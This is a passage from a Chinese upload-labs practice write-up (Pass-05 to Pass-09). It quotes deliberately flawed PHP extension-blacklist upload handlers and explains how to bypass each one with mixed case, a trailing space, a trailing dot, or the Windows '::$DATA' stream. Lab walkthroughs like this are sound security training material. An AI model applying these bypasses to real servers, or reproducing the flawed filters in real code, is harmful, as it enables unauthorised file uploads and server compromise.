class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看出常规的后缀名都禁了，但是可以大小写混写绕过，当然这个目标运行环境得为windows<br><img src="https://img-blog.csdnimg.cn/20210614223221462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2021061422323817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-06</strong><br>查看源码，将所有后缀转为小写在比对，所有大小写混写是行不通了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Windows解析特点：如果后缀名的最后一位是空格，系统会自动把空格给删掉<br><img src="https://img-blog.csdnimg.cn/2021061422504110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614225113927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-07</strong></p><p>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>没有去除结尾的” .”（空格+点）,可绕过<br><img src="https://img-blog.csdnimg.cn/20210614225438887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210614225459616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-08</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现没有过滤”::$DATA”<br>Windows解析特点：文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，并不会检测后缀名。<br><img src="https://img-blog.csdnimg.cn/20210614230824181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614231015774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-09</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span 